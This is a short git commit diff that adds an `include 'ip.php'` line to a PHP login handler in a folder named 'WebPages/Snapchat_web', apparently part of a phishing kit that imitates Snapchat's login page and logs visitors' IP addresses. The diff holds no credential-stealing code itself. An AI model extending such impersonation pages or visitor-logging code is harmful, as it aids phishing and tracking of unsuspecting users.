3a3b9adcbfbe09437a66cffc687b2da47c9da228
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-07-07 09:40:15 +0500

    include ip.php

--- WebPages/Snapchat_web/login.php
+++ WebPages/Snapchat_web/login.php
@@ -1,4 +1,5 @@
 <?php
+include 'ip.php';
 // define variables and set to empty values
 $nameErr = $error_css = $errortext = $error3 = $error4 = $error1 = $error2 = "";
 
@@ -31,4 +32,3 @@ function test_input($data) {
   $data = htmlspecialchars($data);
   return $data;
 }
-?>
